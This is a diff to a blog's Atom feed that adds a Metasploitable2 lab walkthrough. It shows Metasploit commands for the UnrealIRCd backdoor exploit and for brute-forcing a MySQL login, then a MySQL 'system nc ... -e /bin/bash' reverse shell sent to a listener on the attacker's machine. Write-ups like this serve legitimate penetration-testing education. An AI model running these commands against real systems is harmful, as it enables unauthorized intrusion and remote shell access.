@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-23T15:21:23-05:00</updated>
+  <updated>2016-06-27T14:52:27-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -22,6 +22,8 @@
 <li>netdiscover</li>
 <li>Nmap</li>
 <li>Metasploit</li>
+<li>smbclient</li>
+<li>enum4linux</li>
 </ul>
 
 
@@ -520,6 +522,72 @@
 <p><code>smbclient //192.168.79.179/tmp</code></p>
 
 <p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Unreal ircd exploit</h3>
+
+<p><code>msf &gt; search unreal ircd</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>same version</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor
+</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set rhost 192.168.79.179
+</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; exploit</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Mysql exploit</h3>
+
+<h4>Discover MySQL version:</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/mysql/mysql_version
+</span><span class='line'>msf auxiliary(mysql_version) &gt; set rhosts 192.168.79.179
+</span><span class='line'>msf auxiliary(mysql_version) &gt; run</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<h4>Brute Force MySQL Login</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/mysql/mysql_login
+</span><span class='line'>msf auxiliary(mysql_login) &gt; set rhosts 192.168.79.179
+</span><span class='line'>msf auxiliary(mysql_login) &gt; set USER_FILE /usr/share/wordlists/rockyou.txt
+</span><span class='line'>msf auxiliary(mysql_login) &gt; set PASS_FILE /usr/share/wordlists/rockyou.txt
+</span><span class='line'>msf auxiliary(mysql_login) &gt; run</span></code></pre></td></tr></table></div></figure>
+
+
+<p>get root and guest without setting password</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Once get the credential, login to MySQL</p>
+
+<p><code>mysql -h 192.168.79.179 -u root -p</code></p>
+
+<p>In Kali setup nc:</p>
+
+<p><code>nc -nlvp 1234</code></p>
+
+<p>In MySQL, execute system command:</p>
+
+<p><code>mysql&gt; system nc 192.168.79.173 1234 -e /bin/bash</code></p>
+
+<p>get the root:</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
